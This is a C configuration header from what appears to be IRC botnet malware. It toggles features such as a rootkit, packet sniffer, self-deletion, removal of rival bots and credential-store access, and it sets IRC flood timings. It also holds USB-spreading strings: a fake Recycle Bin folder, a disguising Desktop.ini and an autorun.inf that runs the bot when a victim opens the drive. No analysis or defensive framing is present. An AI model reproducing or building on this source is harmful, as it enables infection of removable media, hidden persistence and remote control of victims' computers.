#define NO_OPENSSL
#define NO_CONNCHECK		// Disable connection check before connect attempt
#define NO_SERVICE
#define NO_DLLTEST			// Disable dlltest
#define NO_VERSION_REPLY
#define NO_PING_REPLY
#define NO_CEL
//#define NO_WINDOWCTRL		// Disable window control
#define NO_FU
//#define NO_PSTORE
//#define NO_SECURE
//#define NO_VIRUSREMOVE    //crashes some bots
//#define NO_DOWNLOAD
//#define NO_SOCK4SERV
#define NO_RDRIV				// Disable built-in FU Rootkit functions
//#define NO_REGCTRL
//#define NO_FLUSHDNS
//#define NO_FLUSHARP
//#define NO_PROCESS		// Disable process control
//#define NO_SYSINFO		// Disable sysinfo
//#define NO_DRIVEINFO		// Disable drive info
//#define NO_NETINFO		// Disable network info
//#define NO_CHECKHOST		// Disable country checking
//#define NO_NETSTATP		// Disable netstatp
//#define NO_SPY_WARNING	// Disable possible spy warning (will enable login through pm)
//#define NO_MELT			// Don't erase the old bot once moved
#define NO_FCONNECT			// Don't connect to 'cononstart' on startup
//#define NO_SNIFFER
//#define NO_MIRCINFO


#define PING_TIMEOUT	3600	// If the bot hasnt recieved anything in this amount
								// of time it will quit and reconnect (s)
#define MAXPINGSIZE		65500
#define IRCLINE			514
#define MAX_TOKENS		64
#define MAX_LOGINS		3
#define MAX_THREADS		512
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		18
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX
#define FLOOD_DELAY		2000	// Send flood delay (ms)
#define SFLOOD_DELAY	7000	// Reconnect flood delay (ms)
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))
#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif
#define USBSLEEPTIME		12000
#define USB_STR_RECYCLER	"\\RECYCLER"
#define USB_STR_REC_SUBDIR	"\\S-1-6-21-2434476501-1644491937-600003330-1213"
#define USB_STR_DESKTOP_DATA	"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define USB_STR_DESKTOP_INI	"\\Desktop.ini"
#define USB_STR_AUTORUN_INF	"\\autorun.inf"
#define USB_STR_AUTORUN_DATA1	"[autorun]\r\nopen="
#define USB_STR_AUTORUN_DATA2	"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command="
#define USB_STR_AUTORUN_DATA3	"\r\nshell\\open\\default=1"